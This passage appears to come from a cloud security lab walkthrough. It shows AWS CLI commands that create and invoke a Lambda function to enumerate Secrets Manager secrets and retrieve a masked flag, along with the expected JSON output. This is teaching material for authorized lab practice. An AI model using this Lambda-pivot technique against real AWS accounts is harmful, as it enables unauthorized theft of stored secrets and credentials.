    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    },
    "SnapStart": {
        "ApplyOn": "None",
        "OptimizationStatus": "Off"
    },
    "RuntimeVersionConfig": {
        "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:9d15a516fef11563a8c452bd8d3fe5a5a120b73013e74783e925235557467534"
    },
    "LoggingConfig": {
        "LogFormat": "Text",
        "LogGroup": "/aws/lambda/cg-secrets-reader-lab"
    }
}
```

Once active, enumerate available secrets via the Lambda function:
```bash
aws lambda wait function-active-v2 \
  --function-name cg-secrets-reader-lab \
  --region "$REGION" \
  --profile stacked

aws lambda invoke \
  --function-name cg-secrets-reader-lab \
  --cli-binary-format raw-in-base64-out \
  --payload '{}' \
  --region "$REGION" \
  --profile stacked \
  response.json

cat response.json
```

Expected output:
```json
{"secrets": ["cg-flag-lab"]}
```

Then retrieve a specific secret by supplying its name:
```bash
aws lambda invoke \
  --function-name cg-secrets-reader-lab \
  --cli-binary-format raw-in-base64-out \
  --payload '{"secret_id":"cg-flag-lab"}' \
  --region "$REGION" \
  --profile stacked \
  response.json

cat response.json
```

```json
{"secret": "HSM{XXXXXXXXXXXXXXXXXXXXXXXXX}", "secret_binary": null}
```
